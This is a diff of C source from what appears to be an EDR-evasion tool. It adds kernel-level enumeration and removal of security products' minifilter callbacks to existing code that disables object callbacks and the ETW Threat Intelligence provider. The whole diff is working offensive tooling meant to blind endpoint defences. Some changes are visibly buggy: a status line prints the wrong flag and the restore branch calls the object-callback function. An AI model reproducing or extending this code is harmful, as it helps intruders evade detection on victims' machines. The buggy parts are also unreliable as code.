@@ -6,8 +6,10 @@
 #include "ETWThreatIntel.h"
 #include "FileUtils.h"
 #include "Firewalling.h"
+#include "FltmgrOffsets.h"
 #include "KernelCallbacks.h"
 #include "KernelMemoryPrimitives.h"
+#include "MinifilterCallbacks.h"
 #include "PrintFunctions.h"
 #include "ProcessDump.h"
 #include "ProcessDumpDirectSyscalls.h"
@@ -221,7 +223,6 @@ EDRSB_STATUS _LoadWdigestOffsets(EDRSB_CONTEXT* ctx) {
 EDRSB_STATUS EDRSB_Init(_Out_ EDRSB_CONTEXT* ctx, _In_ EDRSB_CONFIG* config) {
     EDRSB_STATUS status;
     BOOL driverInstallRequired = FALSE;
-    BOOL kernelOffsetsLoaded = FALSE;
     ctx->config = config;
 
     if (config->actions.ProtectProcess) {
@@ -232,11 +233,13 @@ EDRSB_STATUS EDRSB_Init(_Out_ EDRSB_CONTEXT* ctx, _In_ EDRSB_CONFIG* config) {
     if (config->bypassMode.Krnlmode) {
         status = _LoadNtosKrnlOffsets(ctx);
         if (status != EDRSB_SUCCESS) {
-            _tprintf_or_not(TEXT("[-] Init failed: required offsets for kernel operations couldn't be loaded (error 0x%lx)!\n"), status);
+            _tprintf_or_not(TEXT("[-] Init failed: required ntoskrnl.exe offsets for kernel operations couldn't be loaded (error 0x%lx)!\n"), status);
             return status;
         }
-        else {
-            kernelOffsetsLoaded = TRUE;
+        BOOL success = LoadFltmgrOffsets(ctx->config->fltmgrOffsetFilePath, ctx->config->offsetRetrievalMethod.Internet);
+        if (!success) {
+            _tprintf_or_not(TEXT("[-] Init failed: required fltmgr.sys offsets for kernel operations couldn't be loaded (error 0x%lx)!\n"), status);
+            return status;
         }
 
         driverInstallRequired = TRUE;
@@ -289,6 +292,7 @@ EDRSB_STATUS Krnlmode_EnumAllMonitoring(_In_opt_ EDRSB_CONTEXT* ctx) {
     BOOL isSafeToExecutePayload = TRUE;
     BOOL foundNotifyRoutineCallbacks;
     BOOL foundObjectsCallbacks;
+    BOOL foundMinifilterCallbacks;
     BOOL isETWTICurrentlyEnabled;
 
     BOOL verbose = ctx ? ctx->config->verbose : FALSE;
@@ -311,7 +315,7 @@ EDRSB_STATUS Krnlmode_EnumAllMonitoring(_In_opt_ EDRSB_CONTEXT* ctx) {
         ctx->foundNotifyRoutineCallbacks = TRUE;
     }
     if (ctx) {
-        _tprintf_or_not(TEXT("[+] Object callbacks have %sbeen found"), ctx->foundNotifyRoutineCallbacks ? TEXT("") : TEXT("NOT"));
+        _tprintf_or_not(TEXT("[+] Kernel notify routines have %sbeen found"), ctx->foundNotifyRoutineCallbacks ? TEXT("") : TEXT("not "));
         _putts_or_not(TEXT("[+] Check if EDR callbacks are registered on processes and threads handle creation/duplication"));
     }
 
@@ -321,6 +325,15 @@ EDRSB_STATUS Krnlmode_EnumAllMonitoring(_In_opt_ EDRSB_CONTEXT* ctx) {
     }
     if (ctx) {
         _tprintf_or_not(TEXT("[+] Enabled EDR object callbacks are %s !\n"), ctx->foundObjectCallbacks ? TEXT("present") : TEXT("not found"));
+        _putts_or_not(TEXT("[+] Check if EDR minifilter callbacks are registered for monitoring disk operations"));
+    }
+
+    foundMinifilterCallbacks = EnumEDRMinifilterCallbacks(foundEDRDrivers, verbose);
+    if (ctx && foundMinifilterCallbacks) {
+        ctx->foundMinifilterCallbacks = TRUE;
+    }
+    if (ctx) {
+        _tprintf_or_not(TEXT("[+] EDR minifilter callbacks are %s !\n"), ctx->foundObjectCallbacks ? TEXT("present") : TEXT("not found"));
     }
 
     if (ctx) {
@@ -343,7 +356,7 @@ EDRSB_STATUS Krnlmode_EnumAllMonitoring(_In_opt_ EDRSB_CONTEXT* ctx) {
         ctx->krnlmodeMonitoringEnumDone = TRUE;
     }
 
-    if (foundNotifyRoutineCallbacks || foundObjectsCallbacks || isETWTICurrentlyEnabled) {
+    if (foundNotifyRoutineCallbacks || foundObjectsCallbacks || foundMinifilterCallbacks || isETWTICurrentlyEnabled) {
         status = EDRSB_KNRL_MONITORING;
     }
     else {
@@ -380,6 +393,11 @@ EDRSB_STATUS Krnlmode_RemoveAllMonitoring(_In_ EDRSB_CONTEXT* ctx) {
         DisableEDRProcessAndThreadObjectsCallbacks(ctx->foundEDRDrivers);
     }
 
+    if (ctx->foundMinifilterCallbacks) {
+        _putts_or_not(TEXT("[+] Disabling minifilter callbacks registered by EDR to monitor I/O operations..."));
+        RemoveEDRMinifilterCallbacks(ctx->foundEDRDrivers);
+    }
+
     if (ctx->isETWTICurrentlyEnabled) {
         DisableETWThreatIntelProvider(ctx->config->verbose);
         ctx->isETWTICurrentlyEnabled = FALSE;
@@ -402,6 +420,11 @@ EDRSB_STATUS Krnlmode_RestoreAllMonitoring(_In_ EDRSB_CONTEXT* ctx) {
 
     if (!ctx->config->actions.DontRestoreCallBacks && ctx->foundObjectCallbacks) {
         _putts_or_not(TEXT("[+] Restoring EDR's kernel object callbacks..."));
+        EnableEDRProcessAndThreadObjectsCallbacks(ctx->foundEDRDrivers);
+    }
+
+    if (!ctx->config->actions.DontRestoreCallBacks && ctx->foundMinifilterCallbacks) {
+        _putts_or_not(TEXT("[+] Restoring EDR's minifilter callbacks..."));
         EnableEDRProcessAndThreadObjectsCallbacks(ctx->foundEDRDrivers);
     }
 
